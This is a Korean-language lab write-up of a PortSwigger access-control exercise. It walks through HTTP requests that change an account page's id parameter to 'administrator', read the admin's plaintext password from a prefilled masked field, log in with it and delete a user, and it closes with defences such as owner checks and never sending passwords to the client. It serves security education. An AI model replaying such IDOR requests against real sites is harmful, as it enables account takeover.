# Lab: User ID controlled by request parameter with password disclosure

## 개요

- **난이도**: Apprentice
- **주제**: Access Control — 수평적 → 수직적 권한 상승 / IDOR / 비밀번호 노출(마스킹 우회)
- **링크**: https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-password-disclosure

## 목표

계정 페이지의 `id` 를 `administrator` 로 바꿔 관리자 비밀번호를 획득하고, 그 계정으로 로그인해 `carlos` 를 삭제한다.

- 계정: `wiener:peter`

## 이전 랩(005~007)과의 차이

```
[005 / 006 / 007 — 타 사용자 정보/API 키 열람]
  수평적 권한 상승에서 그침

[008 — password disclosure (이번)]
  타 사용자(administrator)의 "비밀번호" 까지 노출
  → 그 계정으로 로그인 → 관리자 기능 사용
  → 수평적 권한 상승이 수직적 권한 상승으로 확장
```

## 수평적 → 수직적 권한 상승 (Horizontal to Vertical)

```
1) 같은 등급 사용자(wiener)가 다른 계정의 리소스에 접근  (수평)
2) 그 계정이 관리자(administrator)라면,
   자격증명을 얻어 관리자로 로그인                     (수직)
```

즉, 수평적 취약점이 더 높은 권한을 가진 사용자를 대상으로 하면
결과적으로 관리자 권한 탈취로 이어진다.

## 취약 지점

### 1. id 파라미터로 타 계정 페이지 접근 (IDOR)

```
GET /my-account?id=wiener
                   └──────┘ 변조 가능
```

소유자 검증이 없어 `id` 를 바꾸면 해당 사용자의 계정 페이지를 볼 수 있다.

### 2. 현재 비밀번호를 페이지에 프리필(prefill)해 렌더링

계정 페이지에는 비밀번호 변경 폼이 있고,
**현재 비밀번호가 `type="password"` 입력 필드의 value 로 미리 채워져** 있다.

```html
<form method="POST" action="/my-account/change-password">
  <input required type="hidden" name="csrf" value="...">
  <label>Password</label>
  <input required type="password" name="password" value="SuperSecret123">
  ...
</form>
```

- 화면에는 점(`••••`)으로 가려져 보이지만, **마스킹은 클라이언트 표시일 뿐**이다.
- HTML 소스 / Burp 응답에는 평문이 그대로 들어 있다.

## 공격 단계

### 1단계 — 로그인 및 계정 페이지 확인

`wiener:peter` 로 로그인하고 `/my-account?id=wiener` 요청을 캡처한다.

```
GET /my-account?id=wiener HTTP/1.1
Cookie: session=<wiener 세션>
```

wiener 의 비밀번호가 프리필되어 있음을 확인한다.

### 2단계 — id 를 administrator 로 변조

```
GET /my-account?id=administrator HTTP/1.1
Cookie: session=<wiener 세션>
```

응답 body 확인:

```html
<input required type="password" name="password" value="AdminPassw0rd!">
```

화면에는 마스킹되지만 소스/Burp 에서 관리자 비밀번호 평문을 얻는다.

### 3단계 — 관리자로 로그인

```
POST /login HTTP/1.1

username=administrator&password=AdminPassw0rd!
```

로그인 성공 → 관리자 세션 획득.

### 4단계 — carlos 삭제

```
GET /admin/delete?username=carlos HTTP/1.1
Cookie: session=<administrator 세션>
```

carlos 삭제 완료 → 랩 해결.

## 마스킹된 입력의 위험

```
[사용자가 보는 것]
  ••••••••••   (type="password" 가 점으로 표시)

[실제 응답에 있는 것]
  value="평문비밀번호"

[문제]
  기존 비밀번호를 굳이 페이지에 "복원" 하여 프리필함
  → 서버가 평문을 클라이언트로 전송
  → 비밀번호 변경 폼이 아니라 "비밀번호 조회" 통로가 됨

[정상 설계]
  변경 시 기존 비밀번호를 입력받아 검증하되,
  기존 값을 미리 채워 내려보내지 않는다.
```

## 방어

```
[근본 원인 1 — 인가]
  id 파라미터로 타 계정 조회 시 소유자 검증 부재

[근본 원인 2 — 데이터 최소화]
  현재 비밀번호를 프리필로 클라이언트에 전송

[올바른 방어]
  1. 리소스 소유자 검증 (세션 사용자 == 조회 대상)
     - 불일치 시 403
  2. id 파라미터 대신 세션 기반 식별 사용
  3. 비밀번호는 절대 클라이언트로 내려보내지 않음
     - 변경 시 "현재 비밀번호 입력" → 서버에서 검증
     - 필드는 항상 빈 값으로 렌더링
  4. 비밀번호/자격증명은 서버 측에서 해시로 보관·비교
  5. 민감 필드는 응답 직렬화에서 제외 (allowlist)

[안티패턴]
  type="password" 로 마스킹했으니 안전하다는 착각
  계정 페이지에 현재 비밀번호를 프리필
```

## 핵심 정리

- `/my-account?id=administrator` 로 관리자 계정 페이지에 접근해 비밀번호 평문을 획득했다.
- 비밀번호는 마스킹된 입력 필드에 프리필되어 있었지만, 응답 소스에는 평문으로 존재했다.
- 획득한 자격증명으로 관리자 로그인 후 `carlos` 를 삭제해 수평적 취약점이 수직적 권한 상승으로 이어졌다.
- 방어는 소유자 검증과 함께 비밀번호를 클라이언트에 전송하지 않는 데이터 최소화다.

## 배운 점

- 수평적 권한 상승은 대상이 관리자일 때 곧 수직적 권한 상승이 된다.
- `type="password"` 의 마스킹은 화면 표시일 뿐이며, 응답 body 는 그대로 읽힐 수 있다.
- 비밀번호 변경 폼은 "현재 비밀번호 프리필" 을 하지 않도록 설계해야 하며, 이는 흔한 실수다.
